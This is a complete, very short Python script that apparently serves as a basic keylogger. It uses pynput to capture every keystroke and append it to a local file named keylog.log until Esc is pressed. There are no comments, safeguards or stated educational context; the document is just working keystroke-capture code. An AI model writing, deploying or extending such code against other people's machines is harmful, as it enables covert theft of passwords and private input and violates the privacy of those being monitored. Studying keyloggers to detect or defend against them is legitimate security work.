#!/usr/bin/python3

from pynput import keyboard
import sys

def keyPressed(key):
    if str(key) == 'Key.esc':
        sys.exit(0)
    else:
        with open('keylog.log',  'a') as fileHandler:
            fileHandler.write(str(key))

with keyboard.Listener(on_press = keyPressed) as listener:
    listener.join()
    

